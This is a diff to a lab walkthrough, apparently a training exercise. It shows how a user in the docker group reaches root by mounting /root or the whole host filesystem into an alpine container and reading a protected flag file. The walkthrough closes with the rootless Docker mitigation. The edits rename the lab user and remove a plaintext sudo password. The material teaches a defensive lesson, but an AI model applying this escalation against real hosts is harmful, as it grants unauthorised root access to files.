@@ -16,23 +16,23 @@ The flag is located at /root/secret.txt. Your mission is to retrieve the content
 
 ## Workflow
 
-SSH into the instance as the user `affix` 
+SSH into the instance as the playground user` 
 
 Try and read the /root/secret.txt file 
 
 ```bash
-affix@ip-10-0-0-150:/home/admin$ cat /root/flag.txt
+playground@ip-10-0-0-150:/home/admin$ cat /root/flag.txt
 cat: /root/flag.txt: Permission denied
 ```
 
 As you can see, the user does not have access to the file as its is owned by the root user, in their home directory which they do not have permission to view.
 
-Let's try and change to the root user using the `sudo` command. The affix user has a password set up as `test123`:
+Let's try and change to the root user using the `sudo` command. 
 
 ```bash
-affix@ip-10-0-0-150:/home/admin$ sudo su
-[sudo] password for affix:
-affix is not in the sudoers file.  This incident will be reported.
+playground@ip-10-0-0-150:/home/admin$ sudo su
+[sudo] password for playground:
+playground is not in the sudoers file.  This incident will be reported.
 ```
 
 And that didn't work, as we haven't been given sudo permissions to access the root user.
@@ -44,7 +44,7 @@ Well, we have been given access to the `docker` group on Linux. This group provi
 Lets try a basic hello world, just to make sure our permissions are working as expected:
 
 ```bash
-affix@ip-10-0-0-150:/home/admin$ docker run hello-world
+playground@ip-10-0-0-150:/home/admin$ docker run hello-world
 
 Hello from Docker!
 This message shows that your installation appears to be working correctly.
@@ -72,7 +72,7 @@ So, we can run a Docker container! Now, what about volumes? Maybe we can mount a
 
 We'll use the `alpine` image, a lightweight operating system which includes the commands we want to use to access files: `cd` and `cat`.
 
-To start off, lets create a file in the `affix` user's home directory, and check we can mount and view this file:
+To start off, lets create a file in the `playground` user's home directory, and check we can mount and view this file:
 
 ```bash
 $ echo "testing 123" > ~/test.txt
@@ -81,7 +81,7 @@ $ echo "testing 123" > ~/test.txt
 `~` is shorthand for the current user's home directory. Let's check we've created the file as expected:
 
 ```bash
-affix@ip-10-0-0-150:/home/admin$ cat /home/affix/test.txt
+playground@ip-10-0-0-150:/home/admin$ cat /home/playground/test.txt
 testing 123
 ```
 
@@ -90,7 +90,7 @@ Looks good to me!
 Before we start up the container, lets just get the current hostname of the server, we'll compare the hostname within the container to this to ensure we've entered the container okay.
 
 ```bash
-affix@ip-10-0-0-150:~$ echo $HOSTNAME
+playground@ip-10-0-0-150:~$ echo $HOSTNAME
 ip-10-0-0-150
 ```
 
@@ -98,14 +98,14 @@ ip-10-0-0-150
 Now we'll spin up a container using the alpine image, and mount the home directory using the `-v` flag.
 
 ```bash
-affix@ip-10-0-0-150:~$ docker run -it -v /home/affix:/mnt alpine sh
+playground@ip-10-0-0-150:~$ docker run -it -v /home/playground:/mnt alpine sh
 / #
 ```
 
 We've now created a container, and attached our shell to the shell inside of the container. We can validate we're actually inside of a container by running the following command:
 
 ```bash
-affix@ip-10-0-0-150:~$ docker run -it -v /home/affix:/mnt alpine sh
+playground@ip-10-0-0-150:~$ docker run -it -v /home/playground:/mnt alpine sh
 / # echo $HOSTNAME
 38db24fb0bdd
 / #
@@ -141,14 +141,14 @@ $ /mnt # exit
 Confirm you're back on the host server by checking the hostname:
 
 ```bash
-affix@ip-10-0-0-150:~$ echo $HOSTNAME
+playground@ip-10-0-0-150:~$ echo $HOSTNAME
 ip-10-0-0-150
 ```
 
-Now we will repeat what we did above to create a container from the `alpine` image and mount the user's volume, but this time mounting the `/root` home directory instead of `/home/affix`:
+Now we will repeat what we did above to create a container from the `alpine` image and mount the user's volume, but this time mounting the `/root` home directory instead of `/home/playground`:
 
 ```bash
-affix@ip-10-0-0-150:~$ docker run -it -v /root:/mnt alpine sh
+playground@ip-10-0-0-150:~$ docker run -it -v /root:/mnt alpine sh
 / # echo $HOSTNAME
 c08716be0cf9
 ```
@@ -173,7 +173,7 @@ this is the flag
 We can take this even further, and mount the entire host volume to the container:
 
 ```bash
-affix@ip-10-0-0-150:~$ docker run -it -v /:/mnt alpine sh
+playground@ip-10-0-0-150:~$ docker run -it -v /:/mnt alpine sh
 ```
 
 
@@ -185,6 +185,12 @@ This attack vector can be mitigated by using a rootless installation of Docker.
 https://docs.docker.com/engine/security/rootless/
 
 Now go ahead and connect to your rootless instance, and run the rootless Docker installer:
+
+This is the second instance you have been provided, run the following command within wetty to connect using the password provided to you:
+
+```ssh playground@<INSTANCE>```
+
+Then run the following command to install Docker rootless:
 
 ```
 [ec2-user@ip-10-0-0-63 ~]$ curl -fsSL https://get.docker.com/rootless | sh
